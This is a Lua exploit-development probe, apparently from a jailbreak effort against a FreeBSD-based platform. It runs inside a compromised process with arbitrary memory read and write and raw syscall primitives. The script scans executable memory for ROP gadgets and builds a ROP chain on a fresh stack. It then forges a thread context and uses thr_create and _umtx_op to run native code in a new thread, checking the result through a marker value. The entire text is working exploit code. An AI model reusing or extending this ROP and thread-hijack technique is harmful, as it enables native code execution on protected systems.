-- CRASH_CLASS: MODERATE
-- PROBE 719b: does a native child survive _umtx_op WAIT and get woken?
--
-- Context: 719a spawned two children that waited on a umtx word and never wrote
-- their delete statuses, so either the wait never returns or the child dies
-- inside it. This isolates the barrier itself: the child waits, the parent
-- wakes, and the child then calls getpid and stores the result with
-- mov [rsi],rax;ret. A marker equal to the pid means the whole wait/wake path
-- works from a thr_create child.

print("=== PROBE 719b: umtx gate on a native child ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[A] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local chunk, off = 0x1000, 0
    while off < limit do
        local n = math.min(chunk, limit-off)
        local ok, s = pcall(function() return memory.read_buffer(base+off, n) end)
        if not ok or type(s) ~= "string" then break end
        local pos = string.find(s, pat, 1, true)
        if pos then return base+off+pos-1 end
        off = off + n - (#pat-1)
        if n < chunk then break end
    end
    return nil
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E,0xC3))
local store   = find_pat(ebase, 0x494000, string.char(0x48,0x89,0x06,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
print(string.format("[A] pop_rax=0x%X pop_rsi=0x%X mov[rsi],rax=0x%X jmp$=0x%X", pop_rax or 0, pop_rsi or 0, store or 0, jmp_g or 0))
if not pop_rax or not pop_rsi or not store then print("[A] gadgets missing") return end

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end

local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}

local W = mmap(page)
local marker = mmap(page)
wd(W, 0)
wd(marker, 0xDEADBEEF)

local stack = mmap(page*4)
local base = stack + page*4 - 0x200
wq(base,    uint64(pop_rsi))
wq(base+8,  uint64(marker))
wq(base+16, uint64(pop_rax))
wq(base+24, uint64(20))          -- getpid
wq(base+32, uint64(fn))
wq(base+40, uint64(store))
wq(base+48, uint64(pop_rax))
wq(base+56, uint64(431))
wq(base+64, uint64(fn))
wq(base+72, uint64(jmp_g))
local ctx = memory.alloc(0x500)
zero(ctx, 0x500)
wq(ctx+Ctx.MAGIC, uint64(0x480))
wq(ctx+Ctx.TYPE, uint64(0x10000))
wq(ctx+Ctx.CS, uint64(0x43))
wq(ctx+Ctx.SS, uint64(0x3B))
wq(ctx+Ctx.RIP, uint64(fn))
wq(ctx+Ctx.RSP, uint64(base))
wq(ctx+Ctx.RDI, uint64(W))
wq(ctx+Ctx.RSI, uint64(2))       -- UMTX_OP_WAIT
wq(ctx+Ctx.RDX, uint64(0))
wq(ctx+Ctx.RAX, uint64(454))
local tb = memory.alloc(8)
wq(tb, uint64(0))
local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
print(string.format("[B] thr_create ok=%s rv=%s tid=%s", tostring(ok), tostring(to_num(rv)), string.format("0x%X", rq(tb) or 0)))

local ts = memory.alloc(16)
wq(ts, 0); wq(ts+8, 30000000)
pcall(function() mk(240)(uint64(ts), uint64(0)) end)
print(string.format("[C] before wake marker=0x%X word=0x%X", rd(marker) or 0, rd(W) or 0))
for i=1,20 do
    local wok, wrv = pcall(function() return mk(454)(uint64(W), uint64(3), uint64(1), uint64(0), uint64(0)) end)
    if i == 1 then print(string.format("[D] wake rv=%s", tostring(to_num(wrv)))) end
end
wq(ts, 0); wq(ts+8, 30000000)
pcall(function() mk(240)(uint64(ts), uint64(0)) end)
print(string.format("[E] after wake marker=0x%X word=0x%X alive=%d", rd(marker) or 0, rd(W) or 0,
    to_num(native.fcall_with_rax(fn_ud, 20))))
